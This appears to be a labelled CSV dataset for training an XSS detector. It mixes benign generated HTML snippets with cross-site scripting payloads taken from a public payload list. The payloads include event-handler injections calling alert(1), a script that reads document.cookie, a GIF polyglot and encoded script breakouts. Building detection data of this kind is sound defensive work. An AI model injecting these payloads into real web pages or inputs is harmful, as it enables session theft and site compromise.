text,label,source,length,timestamp
"<dl draggable=""true"" ondragend=""alert(1)"">test</dl>",1,payloadbox,51,2026-03-01T13:13:37.388686
"<style>:target {color: red;}</style><applet id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></applet>",1,payloadbox,115,2026-03-01T13:13:37.392697
"<!'/*""/*/'/*/""/*--></Script><Image SrcSet=K */; OnError=confirm`1` //>",1,payloadbox,70,2026-03-01T13:13:37.396686
"<script>Object.defineProperties(window, {Safe: {value: {get: function() {return document.cookie}}}});alert(Safe.get())</script>",1,payloadbox,127,2026-03-01T13:13:37.395688
<h6>Login</h6>,0,generated,14,2026-03-01T13:13:37.403996
"<element draggable=""true"" ondragenter=""alert(1)"">test</element>",1,payloadbox,63,2026-03-01T13:13:37.388686
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.400996
"<style>:target {color: red;}</style><em id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></em>",1,payloadbox,107,2026-03-01T13:13:37.392697
<small id=x tabindex=1 onfocusin=alert(1)></small>,1,payloadbox,50,2026-03-01T13:13:37.391686
"<rb draggable=""true"" ondragend=""alert(1)"">test</rb>",1,payloadbox,51,2026-03-01T13:13:37.391686
<link onfocusin=alert(1) id=x tabindex=1 style=display:block>,1,payloadbox,61,2026-03-01T13:13:37.389686
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.401989
<img src='image.jpg' alt='image'>,0,generated,33,2026-03-01T13:13:37.400996
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.403996
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.414992
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.413993
"<div draggable=""true"" contenteditable>drag me</div><hr ondragover=alert(1) contenteditable>drop here</hr>",1,payloadbox,105,2026-03-01T13:13:37.387778
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.415994
<sup onblur=alert(1) tabindex=1 id=x></sup><input autofocus>,1,payloadbox,60,2026-03-01T13:13:37.393697
<h6>Login</h6>,0,generated,14,2026-03-01T13:13:37.411988
"<style>@keyframes x{}</style><nextid style=""animation-name:x"" onanimationend=""alert(1)""></nextid>",1,payloadbox,97,2026-03-01T13:13:37.393697
"<img onmousemove=""alert(1)"">test</img>",1,payloadbox,38,2026-03-01T13:13:37.389686
<p>About</p>,0,generated,12,2026-03-01T13:13:37.405009
"<iframe draggable=""true"" ondragenter=""alert(1)"">test</iframe>",1,payloadbox,61,2026-03-01T13:13:37.389686
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.414992
"<rt onbeforecopy=""alert(1)"" contenteditable>test</rt>",1,payloadbox,53,2026-03-01T13:13:37.391686
<span class='class-5324'>Services</span>,0,generated,40,2026-03-01T13:13:37.412991
"<style>@keyframes slidein {}</style><datalist style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></datalist>",1,payloadbox,170,2026-03-01T13:13:37.392697
*/alert(1)</script><script>/*,1,payloadbox,29,2026-03-01T13:13:37.385678
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.405009
"<samp oncut=""alert(1)"" contenteditable>test</samp>",1,payloadbox,50,2026-03-01T13:13:37.391686
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.398687
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.405991
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.407992
<span class='class-2004'>Services</span>,0,generated,40,2026-03-01T13:13:37.401989
"<svg draggable=""true"" ondrag=""alert(1)"">test</svg>",1,payloadbox,50,2026-03-01T13:13:37.394683
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><picture id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></picture>",1,payloadbox,184,2026-03-01T13:13:37.393697
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.409991
<span class='class-2884'>Services</span>,0,generated,40,2026-03-01T13:13:37.405009
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.400996
"<set attributeName=""xlink:href"" begin=""accessKey(b)"" to=""//example.com/?b"" />",1,payloadbox,77,2026-03-01T13:13:37.396686
<span class='class-6374'>Services</span>,0,generated,40,2026-03-01T13:13:37.415994
<img src='image.jpg' alt='image'>,0,generated,33,2026-03-01T13:13:37.414992
<meter id=x tabindex=1 onfocusin=alert(1)></meter>,1,payloadbox,50,2026-03-01T13:13:37.390697
"<style>:target {color:red;}</style><optgroup id=x style=""transition:color 1s"" ontransitionend=alert(1)></optgroup>",1,payloadbox,114,2026-03-01T13:13:37.392697
"<div draggable=""true"" contenteditable>drag me</div><del ondrop=alert(1) contenteditable>drop here</del>",1,payloadbox,103,2026-03-01T13:13:37.387778
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.407992
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.397682
%27%22--%3E%3C%2Fstyle%3E%3C%2Fscript%3E%3Cscript%3ERWAR%280x00010E%29%3C%2Fscript%3E,1,payloadbox,85,2026-03-01T13:13:37.395688
<nav id=x tabindex=1 onfocus=alert(1)></nav>,1,payloadbox,44,2026-03-01T13:13:37.390697
<h6>Login</h6>,0,generated,14,2026-03-01T13:13:37.403007
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.405991
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.398687
"<footer ondblclick=""alert(1)"">test</footer>",1,payloadbox,43,2026-03-01T13:13:37.388686
<blockquote onfocusout=alert(1) tabindex=1 id=x></blockquote><input autofocus>,1,payloadbox,78,2026-03-01T13:13:37.386686
<p>About</p>,0,generated,12,2026-03-01T13:13:37.414992
<basefont id=x tabindex=1 onfocusin=alert(1)></basefont>,1,payloadbox,56,2026-03-01T13:13:37.385678
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.401989
"<param oncontextmenu=""alert(1)"">test</param>",1,payloadbox,44,2026-03-01T13:13:37.391686
<h4>Login</h4>,0,generated,14,2026-03-01T13:13:37.412991
<a href='/page'>Contact</a>,0,generated,27,2026-03-01T13:13:37.406989
<h6>Login</h6>,0,generated,14,2026-03-01T13:13:37.401989
<p>About</p>,0,generated,12,2026-03-01T13:13:37.403996
<h4>Login</h4>,0,generated,14,2026-03-01T13:13:37.407992
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.397682
<span class='class-654'>Services</span>,0,generated,39,2026-03-01T13:13:37.398687
"<kbd oncopy=""alert(1)"" contenteditable>test</kbd>",1,payloadbox,49,2026-03-01T13:13:37.389686
"<title onmousedown=""alert(1)"">test</title>",1,payloadbox,42,2026-03-01T13:13:37.394683
"<content onmousedown=""alert(1)"">test</content>",1,payloadbox,46,2026-03-01T13:13:37.387778
<img src='image.jpg' alt='image'>,0,generated,33,2026-03-01T13:13:37.410992
"<style>@keyframes x{}</style><form style=""animation-name:x"" onanimationstart=""alert(1)""></form>",1,payloadbox,95,2026-03-01T13:13:37.393697
"<style>:target {color: red;}</style><rt id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></rt>",1,payloadbox,107,2026-03-01T13:13:37.392697
<var id=x tabindex=1 onfocusin=alert(1)></var>,1,payloadbox,46,2026-03-01T13:13:37.395688
<p>About</p>,0,generated,12,2026-03-01T13:13:37.413993
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.413993
<p>About</p>,0,generated,12,2026-03-01T13:13:37.405991
"<del draggable=""true"" ondragend=""alert(1)"">test</del>",1,payloadbox,53,2026-03-01T13:13:37.387778
<a href='/page'>Contact</a>,0,generated,27,2026-03-01T13:13:37.398687
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.397682
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.411988
<a href='/page'>Contact</a>,0,generated,27,2026-03-01T13:13:37.403996
<span class='class-2284'>Services</span>,0,generated,40,2026-03-01T13:13:37.403007
"<dl onbeforepaste=""alert(1)"" contenteditable>test</dl>",1,payloadbox,54,2026-03-01T13:13:37.388686
<img src='image.jpg' alt='image'>,0,generated,33,2026-03-01T13:13:37.405009
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.410992
"<blockquote draggable=""true"" ondragstart=""alert(1)"">test</blockquote>",1,payloadbox,69,2026-03-01T13:13:37.386686
"<div id=""130""><math href=""javascript:alert(130)"">CLICKME</math>",1,payloadbox,63,2026-03-01T13:13:37.396686
GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;,1,payloadbox,57,2026-03-01T13:13:37.385678
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.411988
<dd onfocusout=alert(1) tabindex=1 id=x></dd><input autofocus>,1,payloadbox,62,2026-03-01T13:13:37.387778
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><bgsound id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></bgsound>",1,payloadbox,184,2026-03-01T13:13:37.393697
"<div draggable=""true"" contenteditable>drag me</div><style ondrop=alert(1) contenteditable>drop here</style>",1,payloadbox,107,2026-03-01T13:13:37.387778
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.410992
<img src='image.jpg' alt='image'>,0,generated,33,2026-03-01T13:13:37.397682
"<meter onpaste=""alert(1)"" contenteditable>test</meter>",1,payloadbox,54,2026-03-01T13:13:37.390697
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.396686
<h4>Login</h4>,0,generated,14,2026-03-01T13:13:37.410992
<h2>Login</h2>,0,generated,14,2026-03-01T13:13:37.405009
"<xmp onmouseleave=""alert(1)"">test</xmp>",1,payloadbox,39,2026-03-01T13:13:37.395688
"<i draggable=""true"" ondragleave=""alert(1)"">test</i>",1,payloadbox,51,2026-03-01T13:13:37.389686
<svg><thead onload=alert(1)></thead>,1,payloadbox,36,2026-03-01T13:13:37.394683
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.414992
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.409991
"<svg onmousedown=""alert(1)"">test</svg>",1,payloadbox,38,2026-03-01T13:13:37.394683
<h4>Login</h4>,0,generated,14,2026-03-01T13:13:37.397682
<html id=x tabindex=1 onactivate=alert(1)></html>,1,payloadbox,49,2026-03-01T13:13:37.389686
<a href='/page'>Contact</a>,0,generated,27,2026-03-01T13:13:37.413993
"<dir draggable=""true"" ondragstart=""alert(1)"">test</dir>",1,payloadbox,55,2026-03-01T13:13:37.387778
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.407992
<form onsubmit=alert(1)><input type=submit>,1,payloadbox,43,2026-03-01T13:13:37.388686
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.415994
<image id=x tabindex=1 onbeforedeactivate=alert(1)></image><input autofocus>,1,payloadbox,76,2026-03-01T13:13:37.389686
<tbody id=x tabindex=1 onbeforedeactivate=alert(1)></tbody><input autofocus>,1,payloadbox,76,2026-03-01T13:13:37.394683
<img src='image.jpg' alt='image'>,0,generated,33,2026-03-01T13:13:37.396686
"<font onmouseleave=""alert(1)"">test</font>",1,payloadbox,41,2026-03-01T13:13:37.388686
"<strong onclick=""alert(1)"">test</strong>",1,payloadbox,40,2026-03-01T13:13:37.392697
"<ins onmouseenter=""alert(1)"">test</ins>",1,payloadbox,39,2026-03-01T13:13:37.389686
"<article oncopy=""alert(1)"" contenteditable>test</article>",1,payloadbox,57,2026-03-01T13:13:37.385678
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.406989
<img src='image.jpg' alt='image'>,0,generated,33,2026-03-01T13:13:37.398687
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.412991
"<optgroup draggable=""true"" ondragenter=""alert(1)"">test</optgroup>",1,payloadbox,65,2026-03-01T13:13:37.390697
<h2>Login</h2>,0,generated,14,2026-03-01T13:13:37.411988
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.407992
<p>About</p>,0,generated,12,2026-03-01T13:13:37.399984
"<picture onmouseover=""alert(1)"">test</picture>",1,payloadbox,46,2026-03-01T13:13:37.391686
<a href='/page'>Contact</a>,0,generated,27,2026-03-01T13:13:37.398687
"<bgsound draggable=""true"" ondragstart=""alert(1)"">test</bgsound>",1,payloadbox,63,2026-03-01T13:13:37.386686
"<rtc draggable=""true"" ondragleave=""alert(1)"">test</rtc>",1,payloadbox,55,2026-03-01T13:13:37.391686
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.410992
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.414992
<math>,1,payloadbox,6,2026-03-01T13:13:37.396686
"<nextid draggable=""true"" ondragstart=""alert(1)"">test</nextid>",1,payloadbox,61,2026-03-01T13:13:37.390697
"<header onbeforecut=""alert(1)"" contenteditable>test</header>",1,payloadbox,60,2026-03-01T13:13:37.388686
"<sup draggable=""true"" ondragenter=""alert(1)"">test</sup>",1,payloadbox,55,2026-03-01T13:13:37.393697
"<param onkeypress=""alert(1)"" contenteditable>test</param>",1,payloadbox,57,2026-03-01T13:13:37.391686
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.415994
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.409991
<a href='/page'>Contact</a>,0,generated,27,2026-03-01T13:13:37.403007
"<i oncopy=""alert(1)"" contenteditable>test</i>",1,payloadbox,45,2026-03-01T13:13:37.389686
"<footer onkeypress=""alert(1)"" contenteditable>test</footer>",1,payloadbox,59,2026-03-01T13:13:37.388686
"<aside onpaste=""alert(1)"" contenteditable>test</aside>",1,payloadbox,54,2026-03-01T13:13:37.385678
<img src='image.jpg' alt='image'>,0,generated,33,2026-03-01T13:13:37.403007
"<style>@keyframes x{}</style><link style=""animation-name:x"" onanimationstart=""alert(1)""></link>",1,payloadbox,95,2026-03-01T13:13:37.393697
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.405991
"<basefont onmouseenter=""alert(1)"">test</basefont>",1,payloadbox,49,2026-03-01T13:13:37.386686
"<tbody onkeydown=""alert(1)"" contenteditable>test</tbody>",1,payloadbox,56,2026-03-01T13:13:37.394683
<p>About</p>,0,generated,12,2026-03-01T13:13:37.409991
<a href='/page'>Contact</a>,0,generated,27,2026-03-01T13:13:37.408990
"<picture><source srcset=""validimage.png""><image onloadstart=alert(1)></picture>",1,payloadbox,79,2026-03-01T13:13:37.391686
"<ul onbeforepaste=""alert(1)"" contenteditable>test</ul>",1,payloadbox,54,2026-03-01T13:13:37.395688
<a href='/page'>Contact</a>,0,generated,27,2026-03-01T13:13:37.400996
<a href='/page'>Contact</a>,0,generated,27,2026-03-01T13:13:37.408990
<a href='/page'>Contact</a>,0,generated,27,2026-03-01T13:13:37.401989
"<STYLE>@im\port'\ja\vasc\ript:alert(""XSS"")';</STYLE>",1,payloadbox,52,2026-03-01T13:13:37.396686
"<style draggable=""true"" ondrag=""alert(1)"">test</style>",1,payloadbox,54,2026-03-01T13:13:37.392697
<a href='/page'>Contact</a>,0,generated,27,2026-03-01T13:13:37.410992
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.415994
"<select onkeypress=""alert(1)"" contenteditable>test</select>",1,payloadbox,59,2026-03-01T13:13:37.391686
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.407992
